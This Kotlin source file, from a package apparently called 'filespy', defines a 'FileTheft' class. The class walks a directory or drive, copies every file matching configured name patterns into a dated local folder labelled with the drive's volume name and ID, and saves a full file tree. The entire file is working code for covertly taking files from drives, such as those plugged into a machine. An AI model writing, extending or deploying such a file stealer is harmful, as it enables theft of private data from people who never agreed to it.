package studio.papercube.sh.filespy

import studio.papercube.library.fileassist.DriveMarker
import studio.papercube.library.fileassist.getVolumeLabel
import studio.papercube.library.fileassist.validateFileName
import java.io.File
import java.time.LocalDate
import java.time.LocalTime
import java.util.concurrent.CompletableFuture

class FileTheft(val directory: File) : Theft {
    companion object {

        @JvmStatic
        fun timeStamp() = System.currentTimeMillis()

        @JvmStatic
        fun stealSingleFile(f: File,
                            destDir: File = File("${ConfigParameters.instance.dataPath}/${LocalDate.now()}/")): Boolean {
            try {
                val targetFile = File("${destDir.absolutePath}/${f.nameWithoutExtension}-${timeStamp()}.${f.extension}")
                f.copyTo(targetFile, bufferSize = 16384)
                targetFile.setLastModified(f.lastModified())
            } catch (e: Exception) {
                e.printStackTrace()
                return false
            }
            return true
        }

    }

    override fun steal() {
        val patterns = PatternsManager.default.readPatterns()
        val driveMarker = DriveMarker.resolve(directory)
        val destDir = File(
                "${ConfigParameters.instance.dataPath}/" +
                        "${LocalDate.now()}" +
                        "/${LocalTime.now().toString().replace(':', '-').validateFileName()}" +
                        "-${directory.absolutePath.first()}" +
                        "-${directory.getVolumeLabel().validateFileName()}" +
                        "-id${driveMarker.markID()}"
        )
        val fileWalker = FileWalker(directory)
        fileWalker.walk()
                .stream()
                .filter { fileToCheck -> patterns.any { pattern -> pattern.matchesWithName(fileToCheck.name) } }
                .forEach { stealSingleFile(it, destDir) }
        val fileTreeOutput = File(destDir, "FileTree.txt").bufferedWriter()
        fileTreeOutput.write(fileWalker.fileTreeString)
        fileTreeOutput.close()
    }

    fun stealAsync(): CompletableFuture<Unit> {
        return CompletableFuture.supplyAsync { steal() }
    }


}